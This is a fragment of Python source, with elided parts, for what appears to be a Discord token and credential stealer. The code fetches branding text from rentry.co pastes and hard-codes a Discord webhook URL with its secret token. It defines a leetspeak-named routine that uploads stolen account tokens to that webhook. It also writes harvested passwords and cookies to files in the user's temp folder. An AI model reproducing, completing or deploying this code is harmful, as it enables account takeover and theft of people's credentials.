...
cname = "https://rentry.co/2w7y7/raw"
cnameresp = requests.get(cname)
cname = cnameresp.text

footerc = "https://rentry.co/ao7hm/raw"
...
h00k = "https://discord.com/api/webhooks/1129472895765200926/dg7kauJg6PxghzZq9aAyuV_WJ7dU_RbwQL2g-gPN6hdNrrENc-NYIYONsTy76tmRzeu0"
...
def UP104D70K3N(token, path):
    ...
    if pfp == None: 
        pfp = "https://media.discordapp.net/attachments/1048613406367830057/1129470406877786172/e9380f4cdaf341cb1f9b9fae57928e13.jpg"
    else:
    ...
    data = {
        ...
        "embeds": [
            ...
            "footer": {
                "text": f"{footerc}",
                "icon_url": "https://media.discordapp.net/attachments/1048613406367830057/1129470406877786172/e9380f4cdaf341cb1f9b9fae57928e13.jpg"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
        ...
        "avatar_url": "https://media.discordapp.net/attachments/1048613406367830057/1129470406877786172/e9380f4cdaf341cb1f9b9fae57928e13.jpg",
        "username": f"{cname}",
        "attachments": []
        }
...
def wr173F0rF113(data, name):
    path = os.getenv("TEMP") + f"\Svt{name}.txt"
...
def G47H3r411():
    ...
    for file in ["svtpassw.txt", "svtcook.txt"]: 
